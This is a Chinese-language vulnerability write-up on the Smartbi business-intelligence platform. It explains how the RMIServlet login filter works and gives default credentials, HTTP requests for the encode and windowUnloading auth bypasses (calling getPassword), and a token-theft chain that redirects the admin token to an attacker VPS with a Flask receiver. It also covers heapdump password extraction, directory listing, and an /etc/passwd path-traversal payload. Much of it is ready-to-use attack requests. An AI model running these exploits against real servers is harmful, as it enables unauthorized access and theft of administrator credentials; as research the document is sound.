# Smartbi

**默认用户名密码**
```
# 低版本
用户名admin，密码manager
# 高版本
用户名admin 密码admin
```

**版本查看**
```
http://ip/vision/version.txt
http://ip/vision/packageinfo.txt
```

**登陆地址**
```
http://ip/vision/mobileportal.jsp // 移动驾驶舱
http://ip/vision/mobileX/login // 移动驾驶舱
http://ip/vision/index.jsp
```


## 框架结构

smartbi此时的最新版已经到了v10。下面框架结构主要以典型的v8和v10来介绍。无论是v8还是v10都采用的是spring框架。web.xml也变化不大。其中涉及到的一个常被利用的类是RMIServlet

```xml
	<filter>
		<filter-name>CheckIsLoggedFilter</filter-name>
		<filter-class>smartbi.freequery.filter.CheckIsLoggedFilter</filter-class>
	</filter>
	<filter-mapping>
		<filter-name>CheckIsLoggedFilter</filter-name>
		<url-pattern>/vision/RMIServlet</url-pattern>
	</filter-mapping>
	<servlet>
		<servlet-name>RMIServlet</servlet-name>
		<servlet-class>smartbi.framework.rmi.RMIServlet</servlet-class>
		<init-param>
			<param-name>tracedetail</param-name>
			<param-value>true</param-value>
		</init-param>
	</servlet>
	<servlet-mapping>
		<servlet-name>RMIServlet</servlet-name>
		<url-pattern>/vision/RMIServlet</url-pattern>
	</servlet-mapping>
	<servlet-mapping>
		<servlet-name>RMIServlet</servlet-name>
		<url-pattern>*.stub</url-pattern>
	</servlet-mapping>
```

RMIServlet在v8和v10的实现中有一些不同，但大致的逻辑和v8类似，即获取类名、方法名和参数。然后执行动态调用。

```java
public void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException {
    String className = request.getParameter("className");
    String methodName = request.getParameter("methodName");
    String params = request.getParameter("params");
    if (StringUtil.isNullOrEmpty(className) && StringUtil.isNullOrEmpty(methodName) && StringUtil.isNullOrEmpty(params) && request.getContentType().startsWith("multipart/form-data;")) { // 执行文件上传操作
    }
    String resultStr;
    try {
        resultStr = this.processExecute(request, className, methodName, params);
    }
}

public String processExecute(HttpServletRequest request, String className, String methodName, String params) {
    ClientService service = RMIModule.getInstance().getService(className);
  	if(service == null){...}else{
        Object obj=service.execute(methodName, new JSONArray(params))
    }
}

public Object execute(String var1, JSONArray var2) {
    Method var3 = (Method)this.a.get(var1);
    Class[] var4 = var3.getParameterTypes();
    Object[] var5 = new Object[var2.length()];
    Object var15 = var3.invoke(this.b, var5);
    ...
}     
```

这里的动态调用有个小细节。就是`className`不是传入后就直接被调用的，而是`getService()`来获取实际执行的类。该方法位于`RMIModule`类，根据`getService`方法的逻辑，`className`的值需要在属性`e`中。那么就需要看`e`中的值是怎么被`put`进去的。找到相应的代码位于同类的`activate()`方法，逻辑是遍历d中的键值对，放入e中。而`d`属性值本身是要求实现自`IModule`接口。

```java
public class RMIModule implements IModule {
    private Map<String, IModule> d = new HashMap();
    private Map<String, ClientService> e = new HashMap();
  
    public void activate() {
        Iterator var1 = this.d.entrySet().iterator();

        while(var1.hasNext()) {
            Map.Entry var2 = (Map.Entry)var1.next();
            this.e.put(var2.getKey(), new ClientService((IModule)var2.getValue()));
        }

    }
    public ClientService getService(String var1) {
        return (ClientService)this.e.get(var1);
    }
}
```

查找`IModule`接口的实现类约有102个。这些类中的某些方法可能会造成一定的危害，如获取用户密码、SSRF等。但是`RMIServlet`不是未授权访问的，设计了过滤器`CheckIsLoggedFilter`来判断是否登陆。但这个过滤器的设计存在一定的问题。

### v8 过滤器

```java
public void doFilter(ServletRequest servletrequest, ServletResponse servletresponse, FilterChain filterchain) throws IOException, ServletException {
    HttpServletRequest httpRequest = (HttpServletRequest)servletrequest;
    HttpServletResponse httpResponse = (HttpServletResponse)servletresponse;
    servletrequest.setCharacterEncoding("UTF-8");
    String className = httpRequest.getParameter("className");
    String methodName = httpRequest.getParameter("methodName");
    String encode = httpRequest.getParameter("encode");
    if (encode != null) {
        String[] decode = RMICoder.decode(encode);
        className = decode[0];
        methodName = decode[1];
        String params = decode[2];
        httpRequest.setAttribute("className", className);
        httpRequest.setAttribute("methodName", methodName);
        httpRequest.setAttribute("params", params);
        httpRequest.setAttribute("request_encoded", Boolean.TRUE);
    }
    if (this.needToCheck(className, methodName)) { 
        ....
        return
    }
    filterchain.doFilter(httpRequest, httpResponse);
}
```

过滤器`CheckIsLoggedFilter`获取参数`className、methodName、encode`。值得注意的是，在`encode`参数不为空的情况下，`className`和`methodName`的值不是请求传入的，而是从`encode`中解密得到的。如果这些参数都是空值，就从请求流中读取。然后对获取到的类名和方法名进行`needToCheck()`的判断。该方法列出了很多白名单，只要是这些类和方法就不会经过权限校验。

```java
    private boolean needToCheck(String className, String methodName) {
        if (!StringUtil.isNullOrEmpty(className) && !className.equals("BIConfigService")) {
            if (className.equals("UserService") && StringUtil.isInArray(methodName, new String[]{"login", "loginFor", "clickLogin", "loginFromDB", "logout", "isLogged", "isLoginAs", "checkVersion", "hasLicense"})) {
                return false;
            } else if (className.equals("CompositeService") && StringUtil.isInArray(methodName, new String[]{"compositeLogin"})) {
                return false;
            } else if (className.equals("BusinessViewService") && StringUtil.isInArray(methodName, new String[]{"closeBusinessView"})) {
                return false;
            } else if (className.equals("DataSourceService") && StringUtil.isInArray(methodName, new String[]{"clearClientData"})) {
                return false;
            } else if (className.equals("MDSService") && StringUtil.isInArray(methodName, new String[]{"getDefaultEncryptType"})) {
                return false;
            } else if (className.equals("MDSService") && StringUtil.isInArray(methodName, new String[]{"getOAMSURL"})) {
                return false;
            } else if (className.equals("DPPortalService") && StringUtil.isInArray(methodName, new String[]{"removePageBO"})) {
                return false;
            } else if (methodName.equals("login")) {
                return false;
            } else if (className.equals("CommonService") && StringUtil.isInArray(methodName, new String[]{"log"})) {
                return false;
            } else if (className.equals("FingerTipsDataModule")) {
                return false;
            } else if (className.equals("CloudReportModule")) {
                return false;
            } else {
                return !className.equals("MemberManagerModule");
            }
        } else {
            return false;
        }
    }
```



### Service定位

这里也有个需要注意的地方，如果直接搜索`UserService`类，会发现其中并没有`getPassword()`方法。由于框架用到了Spring。所以可以查找配置文件来定位这些`Service`的bean。找到spring配置文件`WEB-INF/applicationContext.xml`，发现有个`bean`对应了`RMIModule`，其中有个键值对，键是`UserService`，对应的是`usermanager`。查找id为`usermanager`对应的类为`UserManagerModule`。这个类中就包含了白名单中的`getPassword、loginFromDB`等方法。

```xml
<bean id="rmi" class="smartbi.framework.rmi.RMIModule" factory-method="getInstance">
		<property name="modules">
			<map>
				<entry><key><value>ManageReportService</value></key><ref bean="ManageReportService" /></entry>
				...
				<entry><key><value>UserService</value></key><ref bean="usermanager" /></entry>
				...
			</map>
		</property>
	</bean>

<bean id="usermanager" class="smartbi.usermanager.UserManagerModule" factory-method="getInstance">
		<property name="daoModule" ref="dao"/>
		<property name="stateModule" ref="state"/>
		<property name="logModule" ref="operationlog"/>
		<property name="metadataModule" ref="metadata"/>
		<property name="systemConfigService" ref="SystemConfigService"/>
		<property name="catalogTreeModule" ref="catalogtree"/>
</bean>
```



### v8 权限绕过-encode

`CheckIsLoggedFilter`过滤器中的`className`和`methodName`可以是（1）encode传入 （2）`httpRequest.getParameter("className");`传入 （3）数据流中读取。

但考虑到执行到RMIServlet后，还需要`request.getParameter("className")`的方式来传入恶意的类和方法，主要从`encode`值来入手构造权限绕过。

从过滤器对`encode`的分解中可以看出，它由三部分组成。

```
String[] decode = RMICoder.decode(encode);
className = decode[0];
methodName = decode[1];
String params = decode[2];
```

跟进RMICoder找到encode方法来生成。但是发现encode方法生成的字符串无法被decode完全还原。经过debug，encode字符串想要成功生成，只需要将`decode()`方法中的a字节数组换成b字节数组。对应的代码行如下。

```java
char var7 = (char)a[var4[var6]];  -> (char)b[var4[var6]];
```

然后构造白名单中的类、方法，字符串如下。

```java
String var="UserService login [\"admin\",\"admin\"]";
```

再对生成的字符串进行encode，发送请求。

```
POST /vision/RMIServlet HTTP/1.1
Host: ip
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EC30BBD3DABB909C5B35A5F292B243D3
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

encode=zDp4Wp4gRip+Sw-R6+/JV/uu(hdR6/uu/ut/uu(hdR6/uu/JT&className=UserService&methodName=getPassword&params=["admin"]
```



### v10 过滤器

v10过滤器针对于`"/vision/RMIServlet`路径做了单独的逻辑处理

```java
public void doFilter(ServletRequest servletrequest, ServletResponse servletresponse, FilterChain filterchain) throws IOException, ServletException {
		boolean isRmi = "/vision/RMIServlet".equals(httpRequest.getServletPath());
  	String requestStr;
 		if (isRmi) {
    	String queryString = httpRequest.getQueryString();
	    String params;
  	  if (queryString != null && queryString.startsWith("windowUnloading")) {
      		params = queryString.length() > "windowUnloading".length() && queryString.charAt("windowUnloading".length()) == '=' ? "windowUnloading=&" : "windowUnloading&";
          String content;
        	if (queryString.length() > params.length()) {
          		content = queryString.substring(params.length());
          		if (content.endsWith("=")) {
            			content = content.substring(0, content.length() - 1);
          		}
            	content = URLDecoder.decode(content, "UTF-8");
          } ...
          if (content.indexOf("className=") == -1 && content.indexOf("methodName=") == -1) {
            	String[] decode = RMICoder.decode(content);
            	className = decode[0];
            	methodName = decode[1];
            	params = decode[2];
            	httpRequest.setAttribute("request_encoded", Boolean.TRUE); // 进行编码
          } else {
            	Map<String, String> map = HttpUtil.parseQueryString(content);
            	className = (String)map.get("className");
            	methodName = (String)map.get("methodName");
            	params = (String)map.get("params");
          }
      }
      if (FilterUtil.needToCheck(className, methodName) && (!"true".equals(session.getAttribute("is_config_login")) || !this.monitorInvoke(className, methodName))) {...}
      filterchain.doFilter(httpRequest, httpResponse);
}
```

相较于v8版本，这一版主要对RMIServlet路径加入了`windowUnloading`参数判断。第一个if主要是获取请求参数。假如url为`http://ip:port?windowUnloading=&xxx`。那么`httpRequest.getQueryString();`获取到的就是`windowUnloading=&xxx`。即`params`值`windowUnloading=&xxx`，`content`值为`xxx`。然后再从content中获取`className`和`methodName`，如果这两个字段不存在，就对content整体进行解密来获取。如果存在就直接获取字段后的值。

后续会对`className`和`methodName`用`needToCheck()`方法进行校验。`needToCheck()`方法参考v8，有一些小差别，但基本差不多。

那么构造方式就类似v8的权限绕过，只是不用`encode`，而是构造`windowUnloading`

```
POST /vision/RMIServlet?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1
Host: ip

className=UserService&methodName=isLogged&params=[]
```

解密后如下

```
UserService
checkVersion
["2023-03-31 18:56:53"]
```

### 注解扫描

web.xml中有如下的监听器

```xml
<listener>
   <listener-class>smartbix.web.SmartbiXContextLoadListener</listener-class>
</listener>
```

跟进监听器类中的代码。如果从`SmartbiXStartupServlet`获取的Servlet不为空，就添加一个路由`/smartbix/api/*`。

```java
    public void onContextLoad(ServletContext context) throws Exception {
        this.initServlet("SmartbiXPatcher", this.loadClass("smartbix.web.SmartbiXPatcherServlet"), context);
        this.initServlet("SmartbiXStartupServlet", this.loadClass("smartbix.smartbi.SmartbiXStartupServlet"), context);
        ServletRegistration.Dynamic servlet = this.initServlet("SmartbiX", this.loadClass("smartbix.spring.SmartbiXDispatcherServlet"), context);
        if (servlet != null) {
            servlet.addMapping(new String[]{"/smartbix/api/*"});
        }
    }
```

`SmartbiXDispatcherServlet`位于`SmartbiX-SmartbixSmartbi-0.0.1.jar`，该jar包存在`smartbix/spring/SmartbiX-servlet.xml`。内容如下。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" ...>
	<!-- 配置自动扫描的包 -->
	<context:component-scan base-package="smartbix" />
	<mvc:annotation-driven />
	<aop:aspectj-autoproxy />
	<mvc:interceptors>
			<!-- 使用bean定义一个Interceptor，直接定义在mvc:interceptors根下面的Interceptor将拦截所有的请求 -->
		<bean class="smartbix.spring.SmartbiXInterceptor" />
		<mvc:interceptor>
			<mvc:mapping path="/datasets/grid/tablelink/**" />
			<mvc:mapping path="/pages/beans/**"/>
			<mvc:mapping path="/pages/refresh/**"/>
			<bean class="smartbix.spring.RealTimeExtractInterceptor"></bean>
		</mvc:interceptor>
		
	</mvc:interceptors>
	<!-- 配置上传 -->
	<bean id="multipartResolver" class="smartbixlibs.org.springframework.web.multipart.commons.CommonsMultipartResolver"  
        p:defaultEncoding="UTF-8" > 
    </bean>
</beans>

```

也就是在初始化的时候会扫描以`smartbix`开头的包，然后将相关的`@Controller`类的`@RequestMapping`基础上添加上前缀路由`/smartbix/api/`。

查找`base-package="smartbix"`，以`smartbix`开头的包位于各个名为`Smartbix-xx-0.0.1.jar`中。相关jar包如下

```
SmartbiX-App-0.0.1.jar
SmartbiX-AugmentedDataSet-0.0.1.jar
SmartbiX-CatalogTree-0.0.1.jar
SmartbiX-Commons-0.0.1.jar
SmartbiX-Config-0.0.1.jar
SmartbiX-DAO-0.0.1.jar
SmartbiX-DataMining-0.0.1.jar
SmartbiX-DataModel-0.0.1.jar
SmartbiX-DataProcess-0.0.1.jar
SmartbiX-DataSet-0.0.1.jar
SmartbiX-DataSource-0.0.1.jar
SmartbiX-Extension-0.0.1.jar
SmartbiX-Material-0.0.1.jar
SmartbiX-MetricsModel-0.0.1.jar
SmartbiX-ModelQuery-0.0.1.jar
SmartbiX-Page-0.0.1.jar
SmartbiX-SmartbiX.SDK-0.0.1.jar
SmartbiX-SmartbiXLibManager-0.0.1.jar
SmartbiX-SmartbixSmartbi-0.0.1.jar
SmartbiX-Template-0.0.1.jar
SmartbiX-UserManager-0.0.1.jar
```



拦截器`SmartbiXInterceptor`其中一个特点就是对扫描的类做权限校验，根据代码逻辑，如果注解上包含`NOT_LOGIN_REQUIRED`就是不用做权限校验的。

```java
permission = (FunctionPermission)method.getBeanType().getAnnotation(FunctionPermission.class);
if (!this.checkPermission(permission)) {
    return false;
} 

private boolean checkPermission(FunctionPermission permission) {
    if (permission == null) {
        return true;
    } else {
        String[] value = permission.value();
        if (value.length == 1 && "NOT_LOGIN_REQUIRED".equals(value[0])) {
            return true;
        } else {
            Set<String> funcs = State.getState().getUser().getFuncs();
            String[] var4 = value;
            int var5 = value.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                String perm = var4[var6];
                if (funcs.contains(perm)) { return true; }
            }

            return false;
        }
    }
}
```



## 历史漏洞

|漏洞名称|访问路径|
|:---:|:---:|
|heapdump抓取密码|`/vision/monitor/heapdump.jsp`|
|目录遍历|`/vision/chooser.jsp?key=&root=%2F`|
|信息泄漏|`/vision/monitor/sysprops.jsp`|
|Token鉴权绕过|`/smartbi/smartbix/api/monitor/token`|
|encode鉴权绕过|`/vision/RMIServlet?encode=xxx`|
|高版本windowUnloading鉴权绕过|`/vision/RMIServlet?windowUnloading=&`|

`encode`和`windowUnloading`都是基于过滤器逻辑问题构造的权限绕过，在上面的框架分析中已经提到。一旦绕过权限校验，RMIServlet由于可以调用诸多类和方法，所以可以通过调用一些特定方法造成各类攻击，这里就不多说了。主要写一下Token鉴权绕过这个漏洞，也相对有意思。

### Token 鉴权绕过

上面这些都是针对于过滤器的权限绕过，主要原因是过滤器的白名单匹配逻辑和RMIServlet的参数调用之间存在问题。即使只采用白名单中的类，也可以构造一定的危害。这个漏洞不同。

漏洞位于`MonitorService`类。这个属于框架结构中注解扫描路由那部分。根据注解路由，此路由前缀应该拼接`/smartbix/api/`。那么此路由访问即为`/smartbix/api/monitor/token`。另外，还需要加上项目根路径`smartbi`。这个路由符合未授权的注解要求`NOT_LOGIN_REQUIRED`。

```java
@Controller
@RequestMapping({"/monitor"})
@ResponseBody
@FunctionPermission({"NOT_LOGIN_REQUIRED"})
public class MonitorService {
    @RequestMapping(
        value = {"/token"},
        method = {RequestMethod.POST}
    )
    @FunctionPermission({"NOT_LOGIN_REQUIRED"})
    public void getToken(@RequestBody String type) throws Exception {
        String token = this.catalogService.getToken(10800000L);
        if (StringUtil.isNullOrEmpty(token)) {
            throw SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail("token is null");
        } else if (!"SERVICE_NOT_STARTED".equals(token)) {
            Map<String, String> result = new HashMap();
            result.put("token", token);
            if ("experiment".equals(type)) {
                EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, new Object[0]);
            } else if ("service".equals(type)) {
                EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, new Object[]{EngineApi.address("service-address")});
            }

        }
    }
}

SERVICE_TOKEN("%s/api/v1/configs/engine/smartbitoken");
```

一般访问`token`接口就是要获取token。代码上首先`getToken`得到一个token。如果token不为空，就根据type的类型将token发送到某个地址上。

（1）getToken获取，会发现token默认是`admin_随机UUID`

```java
private String pushLoginTokenByEngine(Long duration) {
    ...
    String userId = "ADMIN";
    String token = null;
    String username = null;
    User user = userManagerModule.getUserById(userId);
    if (user != null && "1".equals(user.getEnabled())) {
        username = user.getName();
        token = username + "_" + UUIDGenerator.generate();
    }
    return token;
    ...
}
```

（2）postJsonService发送token。首先获取`SERVICE_TOKEN`的地址，然后和`service-address`的机器地址拼接得到完整的url `/service-address/SERVICE_TOKEN`。然后向url地址发送token。

```java
public static <T> T postJsonService(String type, Object data, Class<T> dataType, Object... values) throws Exception {
    String url = ServiceUrl.getUrl(type, values); 
    return HttpsKit.postJson(url, data, dataType); // 向url地址发送{'token':'admin_UUID字符串'}
}

public static String getUrl(String val, Object... values) { // val: ServiceUrl.SERVICE_TOKEN.name(); values: EngineApi.address("service-address")
    ServiceUrl serviceUrl = valueOf(val); // 找到SERVICE_TOKEN的值
    if (serviceUrl != null && serviceUrl.url != null) {
        String url = serviceUrl.url;
        url = String.format(url, values); // url的值为EngineApi.address("service-address")
    }
    ...
    return url;
}

SERVICE_TOKEN("%s/api/v1/configs/engine/smartbitoken");

public static String address(String type) {
    if (type.equals("engine-address")) {
        return SystemConfigService.getInstance().getValue("ENGINE_ADDRESS");
    } else if (type.equals("service-address")) {
        return SystemConfigService.getInstance().getValue("SERVICE_ADDRESS");
    } else {
        return type.equals("outside-schedule") ? SystemConfigService.getInstance().getValue("MINING_OUTSIDE_SCHEDULE") : "";
  }
}
```

如果能控制`service-address`的地址就能将token发送到可控的地址上，从而获取token。在`MonitorService`类中查找有没有ServiceAddress相关的操作，发现其`setServiceAddress`方法可以通过请求体的值更新`SERVICE_ADDRESS`

```java
    @RequestMapping(
        value = {"/setServiceAddress"},
        method = {RequestMethod.POST}
    )
    public ResponseModel setServiceAddress(@RequestBody String serviceAddress) {
        ResponseModel res = new ResponseModel();
        if (StringUtils.isBlank(serviceAddress)) {
            throw SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail("Service address cannot be empty");
        } else {
            this.systemConfigService.updateSystemConfig("SERVICE_ADDRESS", serviceAddress, NodeLanguage.getNodeLanguage("ServiceAddress"));
            res.setMessage("Service address updated successfully");
            return res.setTime();
        }
    }
```

一旦控制了token，就要找到登陆的位置，用token去登陆。`MonitorService`的`login`方法

```java
    @RequestMapping(
        value = {"/login"},
        method = {RequestMethod.POST}
    )
    @FunctionPermission({"NOT_LOGIN_REQUIRED"})
    public Map<String, Object> loginByToken(@RequestBody String token) {
        boolean isLogin = this.catalogService.loginByToken(token);
        Map<String, Object> result = new HashMap();
        result.put("result", isLogin);
        return result;
    }
```

那么将上述思路串联起来，先通过`/setServiceAddress`控制地址，然后通过`/token`将token发送到地址上。通过可控地址接收的token在`/login`时使用登陆。

（1）通过`/setServiceAddress`控制地址

```
# Request
POST /smartbi/smartbix/api/monitor/setServiceAddress

http://ip

# Response
{"took":0,"success":true,"message":"Service address updated successfully", "code":200}
```

（2）通过`/token`将token发送到地址上

```
POST /smartbi/smartbix/api/monitor/token

service
```

在vps上利用python起一个特定路由的服务，代码如下

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/v1/configs/engine/smartbitoken", methods=["GET", "POST", "PUT", "DELETE"])
def receive_request():
    if request.method == "POST":
        try:
            data = request.json
            print("Received JSON data:")
            print(data)
            return jsonify({"message": "Request received successfully"})
        except Exception as e:
            print("Error parsing JSON data:", e)
            return jsonify({"error": "Invalid JSON data"}), 400
    else:
        data = request.args
        print("Received parameters:")
        for key, value in data.items():
            print(f"{key}: {value}")
        return "Request received successfully"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```

此时vps上会收到类似`{'token':'admin_UUID字符串'}`

（3）利用token登陆

```
POST /smartbi/smartbix/api/monitor/login

admin_UUID字符串
```



### heapdump抓取密码
访问如下地址，点击下载，即可得到`HeapDump.bin`
```
https://ip/vision/monitor/heapdump.jsp
```
利用`Eclipse Memory Analyze`工具来分析`HeapDump.bin`，工具下载地址：https://www.eclipse.org/mat/previousReleases.php

工具中有个图标名为`OQL`的功能（Open Object Query Language studio to execute statements），输入如下查询语句，可以得到用户的密码
```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
```

`heapdump.jsp`核心代码如下，会将heapDump中的内容打包到HeapDump.bin文件中
```java
if(request.getParameter("dumpbin") != null) {
	if(log.canHeapDump()) {
		java.util.zip.ZipOutputStream zip = new java.util.zip.ZipOutputStream(response.getOutputStream());
		java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry("HeapDump.bin");
		zip.putNextEntry(entry);
		log.heapDump(zip , false, false); // 生成heapdump
		zip.closeEntry();
		zip.flush();
		zip.close();
	}...
}
```
一般堆内存查询的主要思路是用JDK自带的tools.jar类库中`com.sun.tools.attach.VirtualMachine`类或其实现类。该类可以获取JVM相关控制权限。获取要监控的JVM的进程号，利用`VirtualMachine.attach()`方法，获取VirtualMachine的实例对象，然后通过实例对象调用`VirtualMachine.heapHisto()`方法，参数为`–all`, 可获到JVM的堆内存信息。如果想要打包出来则是调用`VirtualMachine.dumpHeap()`方法。此漏洞heapDump的实现代码如下
```java
HotSpotVirtualMachine machine = (HotSpotVirtualMachine)((AttachProvider)provider).attachVirtualMachine(pid);
InputStream is = machine.dumpHeap(new Object[]{tmp.getCanonicalPath(), all ? "-all" : "-live"});
ByteArrayOutputStream baos = new ByteArrayOutputStream();
byte[] buff = new byte[1024];

int readed;
while((readed = is.read(buff)) > 0) {
    baos.write(buff, 0, readed);
}

is.close();
```

### 目录遍历
访问地址如下，可以看到操作系统根目录下的文件夹列出在屏幕上
```
/vision/chooser.jsp?key=&root=%2F
```
chooser.jsp的核心如下，其中`new File()`的用法需要注意，它不仅可以创建文件名还可以创建目录，所以如果root传入的是`.`代表当前目录或是`/`根目录，它的exists()判断都是为真的。
```jsp
<%
	String key = request.getParameter("key");
	String path = request.getParameter("root");
	String pathValue = (path == null || "null".equals(path)) ? null : path;
	if (pathValue != null && !new File(pathValue).exists()) {
		pathValue = null;
		path = "";
	}
	ArrayList folders = getFolderNames(pathValue,key);
%>
```
getFolderNames方法如下，根据传入的路径列出目录下的文件夹，或者直接列出操作系统根目录下的文件夹
```java
public static ArrayList getFolderNames(String parentPath, String key) {
    ArrayList result = new ArrayList();
    File[] fs = null;
    if (parentPath == null)
        fs = File.listRoots();
    else {
        File f = new File(parentPath); 
        if (f.exists())
            fs = f.listFiles();
        else
            fs = File.listRoots();
    }
    if (fs != null) {
        File f = null;
        for (int i = 0; i < fs.length; i++) {
            f = fs[i];
            if (f.isDirectory() || key.equalsIgnoreCase("DATAFILE")) {
                String path = f.getPath();
                if (path.indexOf("System Volume Information") == -1)
                    result.add(path.replaceAll("\\\\", "/"));
            }
        }
    }
    return result;
}
```
### 信息泄漏
访问地址如下，可以看到包含了操作系统、Java、用户路径的相关信息
```
/vision/monitor/sysprops.jsp -> 操作系统参数
/vision/monitor/hardwareinfo.jsp -> 局域网内的ip地址
/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode -> 包含的第三方库
```
sysprops.jsp的核心代码，主要是`System.getProperties();`获取了系统参数
```
Properties prop = System.getProperties();
List list = new ArrayList(prop.keySet());
Collections.sort(list);
for(int i = 0; i < list.size(); i++) {
	String key = String.valueOf(list.get(i));
	String value = String.valueOf(prop.getProperty(key));
	out.println("<tr><td>" + key + "</td><td>" + value + "</td></tr>");
}
```
### 其他漏洞
在v85以下还可能存在任意文件下载漏洞，payload如下
```
vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx
```
